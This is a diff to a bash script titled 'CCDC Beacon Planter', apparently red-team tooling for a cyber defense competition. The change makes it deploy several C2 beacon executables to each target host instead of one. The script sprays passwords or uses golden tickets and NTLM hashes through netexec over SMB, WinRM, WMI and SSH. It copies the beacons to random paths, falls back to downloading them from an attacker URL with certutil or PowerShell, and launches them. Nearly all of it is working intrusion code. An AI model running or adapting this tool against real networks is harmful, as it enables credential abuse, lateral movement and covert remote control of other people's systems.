@@ -1,9 +1,10 @@
 #!/bin/bash
 # ================================================
 # CCDC Beacon Planter
-# Usage: ./planter.sh <team> [host] [-p pass_or_hash] [-u user] [-w URL] [-x]
+# Usage: ./planter.sh <team> [host] [-p pass_or_hash] [-u user] [-w URL] [-x] [-b exe]
 #
-#   Finds the first .exe in CWD and plants it on target(s).
+#   Plants C2 binaries on target(s). By default plants ALL .exe files
+#   in CWD (e.g. session.exe + beacon.exe). Use -b to pick one.
 #   Auth priority: golden ticket (team<N>.ccache) → -p cred → spray DA list
 #   Transfer: SMB put → WMI copy → WinRM upload → certutil from URL → powershell IWR from URL
 #   Exec order: SMB → WinRM → WMI → smbexec → SSH (for Linux boxes)
@@ -13,14 +14,14 @@
 #   -p    → password or NTLM hash (overrides golden ticket)
 #   -u    → user (default: Administrator)
 #   -w    → fallback HTTP URL for beacon download if file transfer fails
-#           (e.g. http://10.0.0.5:8080/beacon.exe) — paste later if needed
+#   -b    → specific exe to plant (default: all .exe in CWD)
 #   -x    → use internal 172.16.x.x IPs (through proxychains)
 # ================================================
 
 set -uo pipefail
 
 usage() {
-  echo "Usage: $0 <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-x]"
+  echo "Usage: $0 <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-b exe] [-x]"
   echo ""
   echo "  host can be:"
   echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
@@ -30,11 +31,13 @@ usage() {
   echo "  -p PASS  password or NTLM hash"
   echo "  -u USER  specify user (default: Administrator)"
   echo "  -w URL   fallback HTTP URL to download beacon if file xfer fails"
+  echo "  -b EXE   specific binary to plant (default: all .exe in CWD)"
   echo "  -x       use internal 172.16.x.x IPs (via proxychains)"
   echo ""
   echo "Examples:"
-  echo "  $0 5                               # plant on all boxes (golden ticket auto)"
+  echo "  $0 5                               # plant all .exe on all boxes"
   echo "  $0 5 1                             # plant on curiosity only"
+  echo "  $0 5 -b session.exe                # plant only session.exe"
   echo "  $0 5 anger -p Th3cake1salie!"
   echo "  $0 5 -w http://10.0.0.5:8080/b.exe"
   exit 1
@@ -53,17 +56,19 @@ BEACON_URL=""
 TARGET_ARG=""
 TIMEOUT=2
 USE_INTERNAL=0
+SPECIFIC_BIN=""
 
 # Grab optional positional host arg (before flags)
 if [[ $# -gt 0 && "$1" != -* ]]; then
   TARGET_ARG="$1"; shift
 fi
 
-while getopts "p:u:w:x" opt; do
+while getopts "p:u:w:b:x" opt; do
   case "$opt" in
     p) PASS="$OPTARG" ;;
     u) USER_OVERRIDE="$OPTARG" ;;
     w) BEACON_URL="$OPTARG" ;;
+    b) SPECIFIC_BIN="$OPTARG" ;;
     x) USE_INTERNAL=1 ;;
     *) usage ;;
   esac
@@ -102,27 +107,39 @@ else
   exit 1
 fi
 
-# ====================== FIND BEACON EXE ======================
-BEACON_FILE=""
-for f in *.exe; do
-  if [[ -f "$f" ]]; then
-    BEACON_FILE="$f"
-    break
+# ====================== FIND C2 BINARIES ======================
+BEACON_FILES=()
+if [[ -n "$SPECIFIC_BIN" ]]; then
+  # User specified a particular binary
+  if [[ -f "$SPECIFIC_BIN" ]]; then
+    BEACON_FILES+=("$SPECIFIC_BIN")
+  else
+    echo "[-] Specified binary not found: $SPECIFIC_BIN"
+    exit 1
   fi
-done
+else
+  # Default: collect ALL .exe files in CWD
+  for f in *.exe; do
+    [[ -f "$f" ]] && BEACON_FILES+=("$f")
+  done
+fi
 
-if [[ -z "$BEACON_FILE" ]]; then
+if [[ ${#BEACON_FILES[@]} -eq 0 ]]; then
   echo "[!] No .exe found in current directory"
   if [[ -z "$BEACON_URL" ]]; then
-    echo "[-] No beacon file and no -w URL specified. Nothing to plant."
+    echo "[-] No binaries and no -w URL specified. Nothing to plant."
     exit 1
   fi
   echo "[*] Will rely on -w URL download only: $BEACON_URL"
+  BEACON_FILES=("beacon.exe")  # placeholder name for URL-only mode
 fi
 
-BEACON_NAME="${BEACON_FILE:-beacon.exe}"
-echo "[+] Beacon : ${BEACON_FILE:-'(remote URL only)'}"
-echo "[+] Targets: ${TARGETS[*]}"
+# Globals used by transfer functions — set per-binary in the plant loop
+BEACON_FILE=""
+BEACON_NAME=""
+
+echo "[+] Binaries: ${BEACON_FILES[*]}"
+echo "[+] Targets : ${TARGETS[*]}"
 
 # ====================== AUTH SETUP ======================
 # Priority: golden ticket → explicit -p creds → spray DA list
@@ -437,116 +454,16 @@ exec_beacon() {
   return 1
 }
 
-# ====================== TRANSFER + EXEC ON ONE HOST ======================
-plant_on_host() {
-  local hostname="$1"
-  local ip
-  if [[ $USE_INTERNAL -eq 1 ]]; then
-    ip="${HOST_INTERNAL[$hostname]}"
-  else
-    ip="192.168.20${TEAM}.${HOST_OCTET[$hostname]}"
-  fi
-  local fqdn="${hostname}.${DOMAIN}"
+# ====================== TRANSFER + EXEC ONE BINARY ======================
+# Called with: transfer_exec_one <ip> <user> <hostname>
+# Uses globals: BEACON_FILE, BEACON_NAME, USE_KERBEROS, AUTH_FLAG, PASS, etc.
+transfer_exec_one() {
+  local ip="$1" authed_user="$2" hostname="$3" authed_proto="$4"
 
-  echo "  [*] ${hostname} (${ip})"
-
-  # Save auth state so kerberos fallback on one host doesn't affect others
-  local save_kerberos=$USE_KERBEROS
-  local save_auth_flag="$AUTH_FLAG"
-  local save_pass="$PASS"
-
-  # Determine authed user — try each until one works
-  local authed_user="" authed_proto=""
-
-  for user in "${ALL_USERS[@]}"; do
-    # Quick auth check via SMB → WinRM → WMI
-    for proto in smb winrm wmi; do
-      local port
-      case "$proto" in
-        smb)   port=445 ;;
-        winrm) port=5985 ;;
-        wmi)   port=135 ;;
-      esac
-      port_open "$ip" "$port" || continue
-
-      local out
-      if [[ $USE_KERBEROS -eq 1 ]]; then
-        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -k 2>&1)
-      else
-        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" 2>&1)
-      fi
-
-      if echo "$out" | grep -qi '\[+\]'; then
-        authed_user="$user"
-        authed_proto="$proto"
-        break 2
-      fi
-    done
-
-    # Try SSH
-    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" || $SPRAY_MODE -eq 1 ]]; then
-      local out
-      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" 2>&1)
-      if echo "$out" | grep -qi '\[+\]'; then
-        authed_user="$user"
-        authed_proto="ssh"
-        break
-      fi
-    fi
-  done
-
-  # ---- Kerberos fallback: if ticket auth failed, try password spray ----
-  if [[ -z "$authed_user" && $USE_KERBEROS -eq 1 ]]; then
-    echo "    [!] Kerberos ticket failed — falling back to password spray"
-    for user in "${SPRAY_USERS[@]}"; do
-      for proto in smb winrm wmi; do
-        local port
-        case "$proto" in
-          smb)   port=445 ;;
-          winrm) port=5985 ;;
-          wmi)   port=135 ;;
-        esac
-        port_open "$ip" "$port" || continue
-
-        local out
-        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -p "$FALLBACK_PASS" 2>&1)
-
-        if echo "$out" | grep -qi '\[+\]'; then
-          authed_user="$user"
-          authed_proto="$proto"
-          # Switch to password mode for transfer/exec on this host
-          AUTH_FLAG="-p"
-          PASS="$FALLBACK_PASS"
-          USE_KERBEROS=0
-          break 2
-        fi
-      done
-
-      # Try SSH with password
-      if port_open "$ip" 22; then
-        local out
-        out=$(netexec ssh "$ip" -u "$user" -p "$FALLBACK_PASS" 2>&1)
-        if echo "$out" | grep -qi '\[+\]'; then
-          authed_user="$user"
-          authed_proto="ssh"
-          AUTH_FLAG="-p"
-          PASS="$FALLBACK_PASS"
-          USE_KERBEROS=0
-          break
-        fi
-      fi
-    done
-  fi
-
-  if [[ -z "$authed_user" ]]; then
-    echo "    [-] No valid creds found — skipping"
-    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
-    return 1
-  fi
-  echo "    [+] Auth: ${authed_user} via ${authed_proto}"
+  echo "    --- ${BEACON_NAME} ---"
 
   # ---- Pick drop locations ----
-  local rand_path safe_dest
+  local rand_path
   rand_path=$(random_drop_path)
 
   # ---- TRANSFER (try each method × each path until one works) ----
@@ -616,28 +533,146 @@ plant_on_host() {
   fi
 
   if [[ $transferred -eq 0 ]]; then
-    echo "    [-] All transfer methods failed — skipping"
-    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
+    echo "    [-] All transfer methods failed for ${BEACON_NAME}"
     return 1
   fi
 
   # ---- EXECUTE ----
   if exec_beacon "$ip" "$authed_user" "$REMOTE_PATH"; then
-    echo "    [+] BEACON LAUNCHED on ${hostname}"
-    USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
+    echo "    [+] LAUNCHED ${BEACON_NAME} on ${hostname}"
     return 0
   else
-    echo "    [-] Transfer OK but execution failed on ${hostname}"
+    echo "    [-] Transfer OK but execution failed for ${BEACON_NAME} on ${hostname}"
+    return 1
+  fi
+}
+
+# ====================== PLANT ALL BINARIES ON ONE HOST ======================
+plant_on_host() {
+  local hostname="$1"
+  local ip
+  if [[ $USE_INTERNAL -eq 1 ]]; then
+    ip="${HOST_INTERNAL[$hostname]}"
+  else
+    ip="192.168.20${TEAM}.${HOST_OCTET[$hostname]}"
+  fi
+  local fqdn="${hostname}.${DOMAIN}"
+
+  echo "  [*] ${hostname} (${ip}) — ${#BEACON_FILES[@]} binary(ies)"
+
+  # Save auth state so kerberos fallback on one host doesn't affect others
+  local save_kerberos=$USE_KERBEROS
+  local save_auth_flag="$AUTH_FLAG"
+  local save_pass="$PASS"
+
+  # Determine authed user — try each until one works
+  local authed_user="" authed_proto=""
+
+  for user in "${ALL_USERS[@]}"; do
+    for proto in smb winrm wmi; do
+      local port
+      case "$proto" in
+        smb)   port=445 ;;
+        winrm) port=5985 ;;
+        wmi)   port=135 ;;
+      esac
+      port_open "$ip" "$port" || continue
+
+      local out
+      if [[ $USE_KERBEROS -eq 1 ]]; then
+        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -k 2>&1)
+      else
+        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" 2>&1)
+      fi
+
+      if echo "$out" | grep -qi '\[+\]'; then
+        authed_user="$user"
+        authed_proto="$proto"
+        break 2
+      fi
+    done
+
+    # Try SSH
+    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" || $SPRAY_MODE -eq 1 ]]; then
+      local out
+      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" 2>&1)
+      if echo "$out" | grep -qi '\[+\]'; then
+        authed_user="$user"
+        authed_proto="ssh"
+        break
+      fi
+    fi
+  done
+
+  # ---- Kerberos fallback: if ticket auth failed, try password spray ----
+  if [[ -z "$authed_user" && $USE_KERBEROS -eq 1 ]]; then
+    echo "    [!] Kerberos ticket failed — falling back to password spray"
+    for user in "${SPRAY_USERS[@]}"; do
+      for proto in smb winrm wmi; do
+        local port
+        case "$proto" in
+          smb)   port=445 ;;
+          winrm) port=5985 ;;
+          wmi)   port=135 ;;
+        esac
+        port_open "$ip" "$port" || continue
+
+        local out
+        out=$(netexec "$proto" "$ip" -u "$user" -d "$DOMAIN" -p "$FALLBACK_PASS" 2>&1)
+
+        if echo "$out" | grep -qi '\[+\]'; then
+          authed_user="$user"
+          authed_proto="$proto"
+          AUTH_FLAG="-p"
+          PASS="$FALLBACK_PASS"
+          USE_KERBEROS=0
+          break 2
+        fi
+      done
+
+      if port_open "$ip" 22; then
+        local out
+        out=$(netexec ssh "$ip" -u "$user" -p "$FALLBACK_PASS" 2>&1)
+        if echo "$out" | grep -qi '\[+\]'; then
+          authed_user="$user"
+          authed_proto="ssh"
+          AUTH_FLAG="-p"
+          PASS="$FALLBACK_PASS"
+          USE_KERBEROS=0
+          break
+        fi
+      fi
+    done
+  fi
+
+  if [[ -z "$authed_user" ]]; then
+    echo "    [-] No valid creds found — skipping"
     USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
     return 1
   fi
+  echo "    [+] Auth: ${authed_user} via ${authed_proto}"
+
+  # ---- Plant each binary ----
+  local planted_count=0
+  for bin_file in "${BEACON_FILES[@]}"; do
+    BEACON_FILE="$bin_file"
+    BEACON_NAME="$(basename "$bin_file")"
+    if transfer_exec_one "$ip" "$authed_user" "$hostname" "$authed_proto"; then
+      ((planted_count++))
+    fi
+  done
+
+  # Restore auth state
+  USE_KERBEROS=$save_kerberos; AUTH_FLAG="$save_auth_flag"; PASS="$save_pass"
+
+  [[ $planted_count -gt 0 ]] && return 0 || return 1
 }
 
 # ====================== MAIN ======================
 PLANTED=0
 FAILED=0
 
-echo "[*] Planting beacons on team ${TEAM}..."
+echo "[*] Planting on team ${TEAM}..."
 echo ""
 
 for host in "${TARGETS[@]}"; do
@@ -650,7 +685,7 @@ for host in "${TARGETS[@]}"; do
 done
 
 echo "=========================================="
-echo "[*] Results: ${PLANTED} planted, ${FAILED} failed out of ${#TARGETS[@]} targets"
+echo "[*] Results: ${PLANTED} host(s) planted, ${FAILED} failed out of ${#TARGETS[@]} targets"
 if [[ $PLANTED -gt 0 ]]; then
-  echo "[+] Check your C2 console for new beacons."
+  echo "[+] Check your C2 console for new callbacks."
 fi
